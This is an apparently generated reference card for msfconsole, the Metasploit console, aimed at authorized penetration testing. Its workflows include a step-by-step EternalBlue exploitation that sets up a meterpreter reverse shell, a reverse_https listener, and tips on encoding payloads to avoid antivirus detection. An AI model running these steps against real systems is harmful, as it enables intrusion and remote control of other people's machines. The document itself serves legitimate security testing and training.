---
name: Msfconsole
description: Metasploit Framework's primary CLI for exploit development,
  vulnerability validation, and post-exploitation during penetration tests.
registry: registry
tool_id: msfconsole
category: exploitation
tags:
  - exploitation
  - metasploit
  - pentesting
  - vulnerability
  - payload
  - meterpreter
  - red-team
mitre_techniques:
  - T1190
  - T1203
  - T1210
  - T1569.002
  - T1059.001
  - T1059.003
  - T1046
summary: "msfconsole is the command-line interface for Metasploit Framework.
  Launch with `/usr/bin/msfconsole` or `msfconsole -q` for quiet mode. Use
  `search` with filters (type:exploit, cve:, platform:, name:) to find modules.
  Select modules with `use <path>`, configure with `set OPTION value` or `setg`
  for global, review with `show options`, and execute with `exploit` or `run`.
  Common options: RHOSTS (target IP), LHOST (attacker IP), LPORT (listener
  port), PAYLOAD. Use `exploit -j` to background jobs, `exploit -z` to avoid
  interaction. Manage sessions with `sessions -l` (list), `sessions -i <id>`
  (interact), `sessions -K` (kill all). Database commands: `db_nmap` imports
  scan results. `check` tests if target is vulnerable before exploiting. Tab
  completion works for all commands. `info <module>` shows detailed module
  information including targets, payloads, references. `show payloads`, `show
  targets`, `show encoders` list compatible options for active module. `back`
  exits current module context. External commands run with shell syntax (e.g.,
  `ping 192.168.1.1`). Use `handler` to spawn background payload listeners.
  Expect noisy network signatures; not ideal for evasion-focused engagements.
  Requires PostgreSQL database for workspace features. Module paths: exploit/,
  auxiliary/, post/, payload/, encoder/, nop/, evasion/. Always verify target
  scope before execution."
sources:
  - https://hackviser.com/tactics/tools/metasploit
  - https://www.offsec.com/metasploit-unleashed/msfconsole-commands/
  - https://www.offsec.com/metasploit-unleashed/msfconsole/
  - https://www.hackthebox.com/blog/metasploit-tutorial
  - https://www.freecodecamp.org/news/learn-metasploit-for-beginners/
  - https://docs.rapid7.com/metasploit/managing-metasploit/
  - https://pentestlab.blog/2012/03/13/msfconsole-commands-cheat-sheet/
  - https://www.scaler.com/topics/cyber-security/msfconsole-commands/
  - https://www.reddit.com/r/hackthebox/comments/194wjg9/is_metasploit_really_used_by_professionals/
  - https://www.imperva.com/learn/application-security/metasploit/
  - https://medium.com/@guvenboyraz/penetration-testing-with-metasploit-42b9c19058c3
  - https://www.metasploit.com/
generated_at: 2026-05-19T11:16:56.441Z
generated_by: anthropic
source_hash: 70656fb3383730b58d305e9403dd24fcacd178cd4f3010fc2ea4e17f6b04fd80
---

# Msfconsole

## Overview

msfconsole is the primary interface for the Metasploit Framework, providing console access to thousands of exploits, auxiliary modules (scanners, fuzzers, DoS), payloads, encoders, and post-exploitation tools. It offers tab completion, command history, database integration with PostgreSQL, and the ability to execute external shell commands. msfconsole is the most feature-complete and stable Metasploit interface, supporting exploit chaining, session management, and workspace collaboration.

## When to use

Use msfconsole when you need to exploit known vulnerabilities (CVEs) after reconnaissance identifies vulnerable services or software versions. Ideal for authorized penetration tests where you have client permission and detection is acceptable. Use for post-exploitation tasks after gaining initial access (privilege escalation, lateral movement, persistence). Employ auxiliary modules for active scanning, fuzzing, or service enumeration. Not recommended for stealth red team operations where EDR/IDS evasion is critical—Metasploit signatures are widely detected. Use when you need rapid exploit prototyping or when validating third-party vulnerability scan results. Always verify you are within authorized scope before launching any module.

## Authentication & setup

No authentication required to launch msfconsole. The tool runs locally; ensure you are operating within authorized test scope and have written permission to target systems. Launch with `msfconsole` or `msfconsole -q` to suppress banner. For database features (workspace management, storing scan results), initialize PostgreSQL with `msfdb init` before first use. Database commands require the service running: check with `db_status` inside msfconsole. If database connection fails, run `msfdb reinit` or `msfdb start`. Configure global settings with `setg` (e.g., `setg LHOST <your_IP>`) to avoid repeating parameters across modules. Update framework with system package manager (apt/yum) or `msfupdate` if using installer version. Check version and update status on launch banner.

## Key commands / parameters

`search <keyword>` finds modules; use filters: `search type:exploit cve:2017 platform:windows`, `search name:smb`, `search author:`, `search bid:`, `search edb:`. `use <module_path>` selects a module (e.g., `use exploit/windows/smb/ms17_010_eternalblue`). `show options` displays required/advanced settings; `show payloads` lists compatible payloads; `show targets` lists OS/version targets; `show advanced` shows advanced options; `show encoders` and `show nops` list obfuscation tools. `set <OPTION> <value>` configures parameters (RHOSTS, RHOST, LHOST, LPORT, PAYLOAD, TARGET); `setg` sets globally across modules. `unset <OPTION>` clears a value. `info <module>` shows detailed module information, references, and CVE links. `check` attempts to determine if target is vulnerable without exploitation. `exploit` or `run` executes the module; `exploit -j` runs as background job; `exploit -z` exploits without interacting with session; `exploit -e <encoder>` specifies payload encoder. `sessions -l` lists active sessions; `sessions -i <id>` interacts with session; `sessions -k <id>` kills session; `sessions -K` terminates all. `jobs -l` lists background jobs; `jobs -k <id>` kills job. `back` exits current module. `help <command>` shows command-specific help. `connect <host> <port>` acts as netcat. Database: `db_nmap <args>` runs nmap and imports results; `db_import <file>` imports scan data; `workspace` manages project workspaces; `hosts`, `services`, `vulns`, `creds` query database. `handler -p <payload> -H <LHOST> -P <LPORT>` spawns background listener.

## Example workflows

**Exploit workflow**: 1) `search ms17_010` to find EternalBlue exploit. 2) `use exploit/windows/smb/ms17_010_eternalblue`. 3) `show options` to see required parameters. 4) `set RHOSTS 192.168.1.50`. 5) `set LHOST 192.168.1.100`. 6) `show payloads` to list compatible payloads. 7) `set PAYLOAD windows/x64/meterpreter/reverse_tcp`. 8) `show targets` if multiple OS versions supported. 9) `set TARGET 0` if needed. 10) `check` to verify vulnerability. 11) `exploit` to run. 12) On success, meterpreter session opens; type `sessions -l` to list. **Database-assisted**: 1) `db_nmap -sV -p- 192.168.1.0/24` scans network. 2) `services -p 445` queries SMB hosts. 3) `hosts` lists discovered systems. 4) `search type:auxiliary smb_version` finds scanner. 5) `use auxiliary/scanner/smb/smb_version`. 6) `services -p 445 -R` auto-sets RHOSTS from database. 7) `run` executes scanner. 8) `vulns` shows identified vulnerabilities. 9) `search cve:<identified_cve>` finds exploit. **Handler setup**: `handler -p windows/meterpreter/reverse_https -H 10.10.14.5 -P 443 -x` sets listener that auto-closes after one session.

## Output format

Interactive console prompt (msf6 > or msf5 >). When module selected, prompt changes to `msf6 exploit(<module_path>) >`. Command output is plain text with ANSI colors. `search` returns table with Name, Disclosure Date, Rank, Check, Description. `show options` returns table with Name, Current Setting, Required, Description. `exploit` output varies by module: success typically shows session ID and type (meterpreter, shell), target information, and session opened message (e.g., `[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 192.168.1.50:49158)`). Failures show error messages or `Exploit completed, but no session was created`. `sessions -l` outputs table with Id, Name, Type, Information, Connection. Database query commands (hosts, services, vulns) return tabular data. Verbose mode (`-v` flag on many commands) increases detail. Use `-o <file.csv>` on search to export results. `spool <file>` logs all console output to file.

## Common pitfalls

Forgetting to set LHOST causes reverse payloads to fail or connect to wrong interface—always verify with `show options`. Using RHOST instead of RHOSTS for multi-target modules causes errors (exploits use RHOST, scanners use RHOSTS). Not checking target compatibility: `show targets` and `set TARGET` correctly. Database not initialized: run `msfdb init` once; check `db_status`. Loud network signatures: Metasploit default payloads are widely signatured by IDS/IPS/EDR; consider custom payloads or avoid for stealth ops. Running exploits outside authorized scope is illegal. `exploit -j` backgrounds jobs but they may time out—monitor with `jobs -l`. Meterpreter sessions can be unstable on certain targets; `sessions -u <id>` attempts to upgrade shell to meterpreter. Payload/exploit mismatches cause failures: ensure architecture (x86/x64) and OS match target. Not using `check` wastes time and risks crashes. Tab completion depends on Ruby readline; if broken, reinstall `libreadline-dev`. Framework updates can break custom modules—test after updates. Firewall/NAV blocks may silently drop payloads; use `exploit -z` and check jobs. Sessions die if you exit msfconsole unless backgrounded (`-j` flag). Not setting payload encoder allows AV detection: `set EnableStageEncoding true`, `set StageEncoder x86/shikata_ga_nai`. Resource scripts (`resource <file.rc>`) automate workflows but fail silently on errors—test interactively first.

## References

• https://www.offsec.com/metasploit-unleashed/msfconsole/
• https://www.offsec.com/metasploit-unleashed/msfconsole-commands/
• https://hackviser.com/tactics/tools/metasploit
• https://docs.rapid7.com/metasploit/managing-metasploit/
• https://www.hackthebox.com/blog/metasploit-tutorial
• https://www.freecodecamp.org/news/learn-metasploit-for-beginners/
• https://pentestlab.blog/2012/03/13/msfconsole-commands-cheat-sheet/
• https://www.scaler.com/topics/cyber-security/msfconsole-commands/
• https://www.metasploit.com/
• https://www.imperva.com/learn/application-security/metasploit/
